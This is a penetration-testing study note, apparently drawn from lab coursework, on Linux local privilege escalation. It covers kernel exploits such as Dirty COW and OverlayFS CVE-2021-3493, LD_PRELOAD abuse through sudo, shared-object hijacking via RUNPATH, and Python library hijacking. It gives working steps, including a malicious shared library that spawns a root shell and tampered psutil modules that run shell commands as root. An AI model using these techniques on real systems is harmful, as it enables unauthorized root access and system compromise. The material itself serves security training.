# Linux Internals-Based Priv Esc

- Kernel Exploit
- Shared Libraries
- Shared Object Hijacking
- Python Library Hijacking

## Kernel Exploit

Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is Dirty COW (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits.

**Enumeration**
````
$ uname -a
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

$ cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
````
Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box.

Exploit 4.4.0-116
````
$ gcc -static kernel_exploit_ubuntu.c -o kernel_exploit_ubuntu && chmod +x kernel_exploit_ubuntu
$ ./kernel_exploit_ubuntu
````

DirtyCow
````
$ gcc -static -static-libgcc -static-libstdc++ dirtycow.c -o dirtycow && chmod +x dirtycow
$ gcc -static dirtycow.c -o dirtycow && chmod +x dirtycow
$ ./dirtycow 
````

CVE-2021-3493 - Ubuntu OverlayFS Local Privesc

Affected Versions
- Ubuntu 20.10
- Ubuntu 20.04 LTS
- Ubuntu 19.04
- Ubuntu 18.04 LTS
- Ubuntu 16.04 LTS
- Ubuntu 14.04 ESM

````
$ gcc -static -static-libgcc -static-libstdc++ -o ubuntu_exploit exploit_ubuntu.c
$ ./ubuntu_exploit
````

## Shared Libraries

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.

Additionally, the LD_PRELOAD environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.

````
$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
````
The image above lists all the libraries required by /bin/ls, along with their absolute paths.

### LD_PRELOAD Privilege Escalation

For this, we need a user with sudo privileges.
````
$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
````
We can exploit the LD_PRELOAD issue to run a custom shared library file.
````
$ gcc -fPIC -shared -o root_ld_preload.so root_ld_preload.c -nostartfiles
$ sudo LD_PRELOAD=/tmp/root_ld_preload.so /usr/sbin/apache2 restart
````

## Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary. We can use ldd to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.
````
$ ldd payroll
libshared.so => /development/libshared.so (0x00007f0c13112000)
````
We see a non-standard library named libshared.so listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.
````
$ readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
````
Before compiling a library, we need to find the function name called by the binary.
````
$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
````
We can copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. 
````
$ cat src.c

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
````
````
$ gcc src.c -fPIC -shared -o /development/libshared.so
$ ./payroll 
Malicious library loaded
# id
uid=0(root)
````
````
$ chmod +x scanner_library_hijacking.sh
$ ./scanner_library_hijacking.sh
````

## Python Library Hijacking

Python is one of the world's most popular and widely used programming languages and has already replaced many other programming languages in the IT industry. There are very many reasons why Python is so popular among programmers. One of them is that users can work with a vast collection of libraries.

Importing Modules
````
#!/usr/bin/env python3
# Method 1
import pandas
# Method 2
from pandas import *
# Method 3
from pandas import Series
````
There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:
- Wrong write permissions
- Library Path
- PYTHONPATH environment variable

### Wrong Write Permissions

This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If SUID/SGID permissions have been assigned to the Python script that imports this module, our code will automatically be included.

If we look at the set permissions of the mem_status.py script, we can see that it has a SUID set.
````
$ ls -l mem_status.py
-rwsrwxr-x 1 root <user> 188 Dec 13 20:13 mem_status.py
````
By analyzing the permissions over the mem_status.py Python file, we understand that we can execute this script and we also have permission to view the script, and read its contents.
````
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
````
So this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module psutil and uses the function virtual_memory().

So we can look for this function in the folder of psutil and check if this module has write permissions for us.

Module Permissions
````
$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():

$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
````
Module Contents
````
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
````
Module Contents - Hijacking
````
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
````
Privilege Escalation
````
$ sudo /usr/bin/python3 ./mem_status.py
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
````

Another way is to check if we have write permission in the directory where the script is located. If we have write permission, simply create a Python file with the same name as the library to be imported. Once the script is executed, it will use the library file that is already in its directory, and thus the result will be the same.

````
$ ls -la .
total 36
drwxr-xr-x 3 student student 4096 Jun 14  2023 .
-rwSrwxr-x 1 root        root         192 May 19  2023 mem_status.py
````
In this case, we have write permission for the directory.
````
vi or nano psutil.py

#!/usr/bin/env python3

import os
def virtual_memory():
    os.system('/bin/bash')
````
````
$ ls -la .
total 36
drwxr-xr-x 3 student student 4096 Jun 14  2023 .
-rwSrwxr-x 1 root        root         192 May 19  2023 mem_status.py
-rwx-rwxr-x 1 student        student         192 May 19  2023 psutil.py
$ sudo /usr/bin/python3 /home/student/mem_status.py
````

### Library Path

In Python, each version has a specified order in which libraries (modules) are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:

**PYTHONPATH Listing**
````
$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
````
To be able to use this variant, two prerequisites are necessary.
- The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.
- We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

**Psutil Default Installation Location**
````
$ pip3 show psutil
...SNIP...
Location: /usr/local/lib/python3.8/dist-packages
...SNIP...
````
**Misconfigured Directory Permissions**
````
$ ls -la /usr/lib/python3.8
total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
````
It appears that /usr/lib/python3.8 path is misconfigured in a way to allow any user to write to it.

**Hijacked Module Contents - psutil.py**

Create psutil.py file in /usr/lib/python3.8
````
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
````
**Privilege Escalation via Hijacking Python Library Path**
````
$ sudo /usr/bin/python3 mem_status.py
uid=0(root) gid=0(root) groups=0(root)
````

### PYTHONPATH Environment Variable

**Checking sudo permissions**
````
$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
````
We are allowed to run /usr/bin/python3 under the trusted permissions of sudo and are therefore allowed to set environment variables for use with this binary by the **SETENV:** flag being set.

**Privilege Escalation using PYTHONPATH Environment Variable**

Create psutil.py file in /tmp/
````
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
uid=0(root) gid=0(root) groups=0(root)
...SNIP...
````
